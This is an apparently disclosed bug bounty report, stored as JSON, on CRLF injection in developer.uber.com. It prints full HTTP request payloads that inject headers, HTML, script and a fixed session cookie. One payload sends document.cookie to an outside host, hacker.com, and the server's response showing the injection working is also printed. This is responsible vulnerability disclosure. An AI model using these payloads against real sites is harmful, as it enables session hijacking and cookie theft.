{
  "id": 125984,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjU5ODQ=",
  "url": "https://hackerone.com/reports/125984",
  "title": "CRLF Injection in developer.uber.com",
  "state": "Closed",
  "substate": "duplicate",
  "readable_substate": "Duplicate",
  "created_at": "2016-03-25T15:46:23.321Z",
  "submitted_at": "2016-03-25T15:46:23.321Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "kirit1193",
    "url": "/kirit1193",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/062/556/530551ba8476a675430c0eb7c2d61e4553c681f3_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 314,
    "url": "https://hackerone.com/uber",
    "handle": "uber",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Uber",
      "twitter_handle": "",
      "website": "https://www.uber.com",
      "about": ""
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2016-05-09T22:38:57.487Z",
  "bug_reporter_agreed_on_going_public_at": "2016-04-11T06:49:53.955Z",
  "team_member_agreed_on_going_public_at": "2016-05-09T22:38:57.408Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "The website located at https://developer.uber.com/ suffers from **CRLF injection**. This allows me to **inject JavaScript, HTML as well as arbitrary HTTP Headers**. Besides this, I can change the HTTP Response code as well, to display whatever I want in the victim's browser.\n\nThe vulnerability resides in the path https://developer.uber.com/dashboard\n\nPlease note that navigating to this website as is, without logging in will give a 302 redirect to the login page. However, if we can send the following HTTP Request:\n\n```\nGET /dashboard/%0d%0aContent-Type: text/html%0d%0aHTTP/1.1 200 OK%0d%0aSet-Cookie: oauth2_sid=\"r0Fs96ZB7tKfqSQ56jY7IlReA3wuF3o4/cLwQ02Pn8hdWLEfnkcD5Nc9ITruyiyUlNOTXu/le7IQLC9tNdvdEoiZYPZC3OXa7ZNQU4sT9ZGFQzF3kSyL8c8BgGGEWqH6\"%0d%0a%0d%0a%3Chtml%3EHacker Content%3C/html%3E%0d%0a%0d%0a%3Cscript%3Ealert(\"Injected js\")%3C/script%3E%0d%0a%0d%0a<!-- HTTP/1.1\nHost: developer.uber.com\nReferer: https://developer.uber.com/\nCookie: XSRF-TOKEN=OkkZ43igro0JS7lm%2B2pdjhh1%2FzzqkueR%2Fgfs4%3D; connect.sid=s%3AHgMm40tOJjVdF6js3Oxv8GP4.RE%2F3fmd02tETNwUaC8AhFzUhLSqsjcCYZo5NsgP%2BTf8;\nHost: developer.uber.com\nConnection: Keep-alive\nAccept-Encoding: gzip,deflate\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21\nAccept: */*\nConnection: close\n```\n\n\nThe HTTP Response contains the injected HTTP Headers and the Cookie!\n\nSo apparently, the Web Application Server parses the current path of the web application (Which in this case is /dashboard) and just appends it to the Location header. So if we change the \"Location\" i.e. */dashboard/* to */dashboard/%0d%0aHeader: Random*, then in the HTTP Response, the *%0d%0a* will create a new line following by a new header, *\"Header: Random\".*\n\nHence using injected Line breaks (CRLFs), we are able to add new HTTP Headers and content.\n\nThe Response is as follows:\n\n```\nHTTP/1.1 302 Moved Temporarily\nServer: nginx\nDate: Fri, 25 Mar 2016 15:17:54 GMT\nContent-Type: text/html\nContent-Length: 154\nLocation: https://developer.uber.com/dashboard/\nContent-Type: text/html\nHTTP/1.1 200 OK\nSet-Cookie: oauth2_sid=\"r0Fs96ZB7tKfqSQ56jY7IlReA3wuF3o4/cLwQ02Pn8hdWLEfnkcD5Nc9ITruyiyUlNOTXu/le7IQLC9tNdvdEoiZYPZC3OXa7ZNQU4sT9ZGFQzF3kSyL8c8BgGGEWqH6\"\n\n<html>Hacker Content</html>\n\n<script>alert(\"Injected js\")</script>\n\n<!--\nConnection: close\nSet-Cookie: oauth2_sid=deleted; path=/; Expires=Thu, 01-Jan-1970 00:00:01 GMT\nStrict-Transport-Security: max-age=0\nX-XSS-Protection: 1; mode=block\nCache-Control: max-age=0\n\n<html>\n<head><title>302 Found</title></head>\n<body bgcolor=\"white\">\n<center><h1>302 Found</h1></center>\n<hr><center>nginx</center>\n</body>\n</html>\n```\n\n\nAs is evident from the Response, both the HTML and Javascript injections work. The first image screenshot of the HTTP Response Render. The rendering of the JavaScript makes this a **Cross-Site Scripting vulnerability** as well, and since the cookies aren't \"Secure\" and \"HttpOnly\" (bugs which aren't allowed in the bounty! ;]), they can easily be extracted by JavaScript and POSTed to my server, making it a **Cookie Stealing** vulnerability as well. Using this HTTP Request:\n\n\n```\nGET /dashboard/%0d%0aContent-Type: text/html%0d%0aHTTP/1.1 200 OK%0d%0aSet-Cookie: oauth2_sid=\"r0Fs96ZB7tKfqSQ56jY7IlReA3wuF3o4/cLwQ02Pn8hdWLEfnkcD5Nc9ITruyiyUlNOTXu/le7IQLC9tNdvdEoiZYPZC3OXa7ZNQU4sT9ZGFQzF3kSyL8c8BgGGEWqH6\"%0d%0a%0d%0a%3Chtml%3EHacker Content%3C/html%3E%0d%0a%0d%0a%3Cscript%3Evar+img=new+Image();img.src=\"http://www.hacker.com/incoming.php?coo=\"%20+%20document.cookie;%3C/script%3E%0d%0a%0d%0a<!-- HTTP/1.1\nHost: developer.uber.com\nReferer: https://developer.uber.com/\nCookie: XSRF-TOKEN=OkkZ43igro0JS7lm%2B2pdjhh1%2FzzqkueR%2Fgfs4%3D; connect.sid=s%3AHgMm40tOJjVdF6js3Oxv8GP4.RE%2F3fmd02tETNwUaC8AhFzUhLSqsjcCYZo5NsgP%2BTf8;\nHost: developer.uber.com\nConnection: Keep-alive\nAccept-Encoding: gzip,deflate\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21\nAccept: */*\nConnection: close\n```\n\n\nFinally, the setting of arbitrary Cookies also renders the Web Application to a **Session Fixation** vulnerability, wherein, I can set an arbitrary cookie in the GET request and wait for the victim to click on the link and login. In this case, the cookie which I've set will then identify the victim's account. Using the same cookie in my browser will authenticate the attacker to his account as well.",
  "original_report_id": 125159,
  "original_report_url": "https://hackerone.com/reports/125159",
  "attachments": [
    {
      "id": 81285,
      "file_name": "Uber.jpg",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/081/285/a4123a465453e8249a62da4b1de2deb8bf98f27f/Uber.jpg?response-content-disposition=attachment%3B%20filename%3D%22Uber.jpg%22%3B%20filename%2A%3DUTF-8%27%27Uber.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2TXGU4NH%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T120358Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCZXXLTvdjrV9%2BXTrnagiitpTSxdTNfuwI8JoO87a374wIgGdKdQ7YeIephBMysf3wfpXJkd8udROvqz%2BslCFnteH4qsgUIcBADGgwwMTM2MTkyNzQ4NDkiDJwtqkOHj%2Bhq7hwpISqPBc3oQJzChWjZ7bKD%2BccTmt7LiDYwnp%2FaW49dMRirZ9pIhrCa7YZHTLZ9RBv6n9DI4zg1cmDjgAWLZcLoHEU6HMSY4TZiQ6JhkTxfHY9%2BW8gIq%2FN6zwvc28EGhPI0bXtMQ05CUe9qLU1IqB2QvVi8ljbC0OENAKpHHW%2B4HZPV3ya4m4CUrmIsBEz02u4o%2FTUWBucXelW27TA%2FMHkcbbkFDMVuk57DqG9l6DCv91Gk0it2LxC7b8QipHE3PIzezn29GFbq0x%2FVAy8j5zhCsVA2u3PoLG8UBgJPigFlduO2n54cymHx0Kj1lPCf0XySDYAG7J%2BkbE9frSbqOenAzEKHL%2BbmTLbvIknLt0tHuWNofydq3sKSVRJUGT6kPaXiG6LcZZAjiidzALZPhPiZjjN2NFbT%2B4d3bYuhSBgSzvUsrX%2FU4t82le3n50YJtFXVQ5QFh1yFj%2BasAJo8gy4CzSP0PgdMEiJHxmad%2BFSBk1osw1BNlolWVHoYfecAbexOr2DelWZtvQEFGBxOieL0Wu0EoUhoxEA%2BwcuNd421R9g0jkhW6T1utyXajONBgYVseJBpWnbW%2BkpGImvblpF9NqajpVHpAAFM6sdMLqiQfJ1f2k9nfS8NIMIMr1C%2Fow0E8D%2FBak4EhkqC2z4QmLpn0zQ7nAVSDGC0pvQQ9HVPj%2BqgNB88SHK9rHZSyCSKf4lsEvYbKl40pk9%2FwaWVlfLBHZ9KQh3Sk5kHWBptfVKftWPHgl3kdZnZZoD7zq5BIGAq%2BfkhmJ1PLAj9CcRgLZKxPmL7BwBfMK1j9GipZrFsKu100o2ehZDw7ycR0yKIZpB5BsA2SMtYyPB%2B8lmSAWsiEcgvv%2BCmvle2pB9btBCR6tP%2FsVAwuKWsrgY6sQEOW7UlyhlECgHHWSD1IxQaKIHYvjLM%2FfiTluais8DBgTs2%2B0ozGJfGCvvwGwuCx3AVFBMiYmPRly4WjCK3xXERtAap5VTGJE61OwLy5AbGPGJEzLPgyw2xUSEbhOBlNW9NWCeq3J6Ykb0rxTuobAmesQY2%2FdIFblQ%2FHHBqxCz3Wf7QF6oiRaFXn07SukEwJwLzpGlJ6GkqAxZz63CXWtQishvehwDUwbs0xamAMs2tYiU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3a7b92917269bc23bbd22484836aeb567a0e66f319e3c4e224948f56000b749f",
      "file_size": 10653,
      "type": "image/jpeg",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2016-05-11T06:49:54.572Z",
  "allow_singular_disclosure_after": -244876443.4592612,
  "singular_disclosure_allowed": true,
  "vote_count": 3,
  "voters": [
    "mashoud1122",
    "shubham_srt",
    "dyabla"
  ],
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
